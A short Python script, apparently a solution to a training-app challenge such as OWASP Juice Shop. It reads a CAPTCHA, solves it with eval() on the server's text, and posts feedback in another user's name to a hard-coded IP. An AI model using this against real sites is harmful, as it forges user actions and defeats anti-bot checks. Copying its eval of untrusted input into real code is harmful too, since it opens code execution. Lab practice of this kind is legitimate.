import json

import requests

s = requests.Session()

r = s.get('http://43.241.202.47:3003/rest/captcha/')
response = json.loads(r.text)
headers = {'Content-type': 'application/json'}
data = {
    "UserId": 8,
    "captcha": str(eval(response['captcha'])),
    "comment": "I'm not Homer!",
    "rating": 5,
    "captchaId": str(response['captchaId'])
}
data_json = json.dumps(data)
r = s.post(
    'http://43.241.202.47:3003/api/Feedbacks/',
    data=data_json,
    headers=headers,
)
print(data)
print(r)
